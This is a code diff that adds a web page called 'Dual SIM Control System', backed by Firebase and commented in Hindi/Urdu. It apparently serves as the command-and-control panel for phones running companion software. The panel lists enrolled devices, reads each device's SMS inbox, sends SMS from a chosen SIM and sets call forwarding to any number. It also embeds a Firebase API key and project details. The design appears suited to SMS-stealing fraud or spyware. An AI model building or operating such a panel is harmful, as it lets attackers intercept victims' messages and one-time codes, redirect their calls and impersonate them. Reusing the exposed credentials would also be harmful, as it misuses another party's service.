@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dual SIM Control System</title>
+    
+    <!-- CSS -->
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f0f2f5; color: #333; }
+        
+        /* Navbar Tabs */
+        .navbar { background: #1e1e2f; padding: 10px; display: flex; justify-content: center; gap: 10px; }
+        .navbar button { background: transparent; color: white; border: none; padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 5px; transition: 0.3s; }
+        .navbar button:hover { background: #444; }
+        .navbar button.active { background: #007bff; }
+        
+        /* Containers */
+        .container { max-width: 600px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: none; }
+        .container.active { display: block; }
+        
+        /* Forms */
+        h2 { margin-top: 0; color: #007bff; }
+        h3 { margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        label { display: block; margin-top: 10px; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { margin-top: 15px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { opacity: 0.9; }
+        
+        /* Lists */
+        .list-item { background: #f9f9f9; padding: 10px; margin-bottom: 8px; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        .list-item:hover { background: #eaeaea; }
+        .status-online { color: green; font-weight: bold; }
+        .status-offline { color: red; font-weight: bold; }
+        
+        /* Logs */
+        .logs { background: #222; color: #0f0; padding: 10px; border-radius: 5px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 14px; }
+        .msg-item { background: #f9f9f9; padding: 8px; border-radius: 4px; margin-bottom: 5px; }
+        
+        /* Error Message */
+        #errorMsg { color: red; font-weight: bold; margin-top: 10px; display: none; }
+        
+        /* Loading Overlay */
+        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; color: white; font-size: 24px; z-index: 1000; }
+    </style>
+</head>
+<body>
+
+    <!-- Navigation Tabs -->
+    <div class="navbar">
+        <button class="active" onclick="showTab('admin')">Admin Dashboard</button>
+        <button onclick="showTab('control')">Control Center</button>
+        <button onclick="showTab('user')">User Simulator</button>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div id="admin" class="container active">
+        <h2>Admin Dashboard</h2>
+        <div id="usersList">Loading users...</div>
+    </div>
+
+    <!-- Control Center -->
+    <div id="control" class="container">
+        <h2>Control Center</h2>
+        <p>Device: <strong id="deviceIdDisplay"></strong></p>
+        <button onclick="window.history.back()">Go Back to Admin</button>
+        
+        <label>Select SIM</label>
+        <select id="simSelect">
+            <option value="0">SIM 1</option>
+            <option value="1">SIM 2</option>
+        </select>
+
+        <h3>Send SMS</h3>
+        <label>Phone Number</label>
+        <input type="text" id="smsNumber">
+        <label>Message</label>
+        <textarea id="smsMessage"></textarea>
+        <button onclick="sendSMS()">Send SMS Command</button>
+
+        <h3>Call Forwarding</h3>
+        <label>Forward To Number</label>
+        <input type="text" id="forwardNumber">
+        <button onclick="setCallForward()">Set Call Forwarding</button>
+
+        <div id="inbox">
+            <h3>Inbox Messages</h3>
+            <div id="inboxList">No messages found.</div>
+        </div>
+    </div>
+
+    <!-- User Simulator -->
+    <div id="user" class="container">
+        <h2>User Device Simulator</h2>
+        <p>Status: <span id="userStatus">Initializing...</span></p>
+        <p>Device ID: <span id="userDeviceId">Loading...</span></p>
+        <h3>Command Logs</h3>
+        <div class="logs" id="logs">Waiting for commands...</div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loading">Processing... Please Wait...</div>
+    <div id="errorMsg"></div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
+    <script>
+        // ==========================================
+        // 🔴 YAHAN PAR APNI FIREBASE CONFIGURATION DAALEIN
+        // ==========================================
+        const firebaseConfig = {
+  apiKey: "AIzaSyAOOO_-YwUdF2hynkli6NZunelQgRYPdFU",
+  authDomain: "surajaifree.firebaseapp.com",
+  databaseURL: "https://surajaifree-default-rtdb.firebaseio.com",
+  projectId: "surajaifree",
+  storageBucket: "surajaifree.firebasestorage.app",
+  messagingSenderId: "427640610354",
+  appId: "1:427640610354:web:a1cf07dd4d099b2674662b",
+  measurementId: "G-DPWHV8FJPH"
+};
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // ==========================================
+        // GLOBAL VARIABLES
+        // ==========================================
+        const params = new URLSearchParams(window.location.search);
+        const deviceId = params.get('device');
+        let currentDeviceId = deviceId; // Agar URL se mila hai toh use karo
+        let isAdminView = !deviceId;    // Agar URL mein device nahi hai, toh Admin view hai
+
+        // ==========================================
+        // TAB NAVIGATION
+        // ==========================================
+        function showTab(tabName) {
+            document.querySelectorAll('.navbar button').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.container').forEach(container => container.classList.remove('active'));
+
+            if (tabName === 'admin') {
+                document.getElementById('admin').classList.add('active');
+                document.querySelector('.navbar button').classList.add('active');
+                loadUsers();
+            } else if (tabName === 'control') {
+                document.getElementById('control').classList.add('active');
+                document.querySelectorAll('.navbar button')[1].classList.add('active');
+                
+                if (!currentDeviceId) {
+                    document.getElementById('deviceIdDisplay').textContent = "Select a user from Dashboard first!";
+                } else {
+                    loadControlCenter();
+                }
+            } else if (tabName === 'user') {
+                document.getElementById('user').classList.add('active');
+                document.querySelectorAll('.navbar button')[2].classList.add('active');
+                setupUserSimulator();
+            }
+        }
+
+        // ==========================================
+        // ADMIN DASHBOARD
+        // ==========================================
+        function loadUsers() {
+            const usersList = document.getElementById('usersList');
+            usersList.innerHTML = "Loading...";
+
+            // Latest User Top (Timestamp Negative)
+            db.ref("Users").orderByChild("timestamp").on("value", snapshot => {
+                usersList.innerHTML = ""; // Clear
+
+                if (!snapshot.exists()) {
+                    usersList.innerHTML = "No users found. Please open User Simulator tab.";
+                    return;
+                }
+
+                snapshot.forEach(child => {
+                    const user = child.val();
+                    const id = child.key;
+                    const statusClass = user.status === "Online" ? "status-online" : "status-offline";
+                    
+                    const div = document.createElement("div");
+                    div.className = "list-item";
+                    div.innerHTML = `
+                        <div><strong>ID: ${user.serial_no || 'N/A'}</strong> - ${user.device_name}</div>
+                        <span class="${statusClass}">${user.status}</span>
+                    `;
+                    
+                    div.onclick = () => {
+                        currentDeviceId = id;
+                        showTab('control');
+                    };
+                    
+                    usersList.appendChild(div);
+                });
+            });
+        }
+
+        // ==========================================
+        // CONTROL CENTER (Admin)
+        // ==========================================
+        function loadControlCenter() {
+            document.getElementById('deviceIdDisplay').textContent = currentDeviceId;
+            
+            const commandRef = db.ref("Commands").child(currentDeviceId);
+            const inboxRef = db.ref("Inbox").child(currentDeviceId);
+
+            // Inbox Load
+            inboxRef.on("value", snapshot => {
+                const inboxList = document.getElementById("inboxList");
+                inboxList.innerHTML = "";
+                if (!snapshot.exists()) {
+                    inboxList.textContent = "No messages found.";
+                    return;
+                }
+                snapshot.forEach(child => {
+                    const msg = child.val().body;
+                    const div = document.createElement("div");
+                    div.className = "msg-item";
+                    div.textContent = msg;
+                    inboxList.appendChild(div);
+                });
+            });
+
+            window.sendSMS = function() {
+                const sim = document.getElementById('simSelect').value;
+                const number = document.getElementById('smsNumber').value;
+                const msg = document.getElementById('smsMessage').value;
+
+                const newCmd = commandRef.push();
+                newCmd.set({
+                    action: "SEND_SMS",
+                    sim_slot: parseInt(sim),
+                    phone_number: number,
+                    message_body: msg,
+                    status: "PENDING"
+                }).then(() => alert("SMS Command Sent!"));
+            };
+
+            window.setCallForward = function() {
+                const sim = document.getElementById('simSelect').value;
+                const number = document.getElementById('forwardNumber').value;
+
+                const newCmd = commandRef.push();
+                newCmd.set({
+                    action: "CALL_FORWARD",
+                    sim_slot: parseInt(sim),
+                    phone_number: number,
+                    status: "PENDING"
+                }).then(() => alert("Call Forwarding Command Sent!"));
+            };
+        }
+
+        // ==========================================
+        // USER SIMULATOR
+        // ==========================================
+        function setupUserSimulator() {
+            const userDeviceId = "device_user_" + Math.floor(Math.random() * 10000);
+            document.getElementById('userDeviceId').textContent = userDeviceId;
+            document.getElementById('userStatus').textContent = "Online";
+
+            const userRef = db.ref("Users").child(userDeviceId);
+
+            // Initial Setup
+            userRef.child("timestamp").set(-Date.now()); // Negative for Latest Top
+            userRef.child("status").set("Online");
+            userRef.child("device_name").set("User's Phone");
+
+            // Auto Serial Number
+            db.ref("Users").orderByChild("serial_no").limitToLast(1).once("value", snapshot => {
+                let lastId = 0;
+                snapshot.forEach(child => {
+                    lastId = child.val().serial_no || 0;
+                });
+                userRef.child("serial_no").set(lastId + 1);
+            });
+
+            // Command Listening
+            const commandRef = db.ref("Commands").child(userDeviceId);
+            commandRef.on("child_added", snapshot => {
+                const cmd = snapshot.val();
+                const log = document.getElementById("logs");
+                const p = document.createElement("p");
+
+                if (cmd.action === "SEND_SMS") {
+                    p.textContent = `SMS Sent to ${cmd.phone_number} from SIM ${cmd.sim_slot}: ${cmd.message_body}`;
+                } else if (cmd.action === "CALL_FORWARD") {
+                    p.textContent = `Call Forwarding set to ${cmd.phone_number} on SIM ${cmd.sim_slot}.`;
+                } else {
+                    p.textContent = `Unknown Command: ${JSON.stringify(cmd)}`;
+                }
+
+                log.prepend(p);
+                
+                // Status Update
+                snapshot.ref.child("status").set("EXECUTED");
+            });
+
+            // Browser Close par Offline
+            window.addEventListener("beforeunload", () => {
+                userRef.child("status").set("Offline");
+            });
+        }
+
+        // Initial Load
+        if (currentDeviceId) {
+            showTab('control');
+        } else {
+            showTab('admin');
+        }
+    </script>
+</body>
+</html>
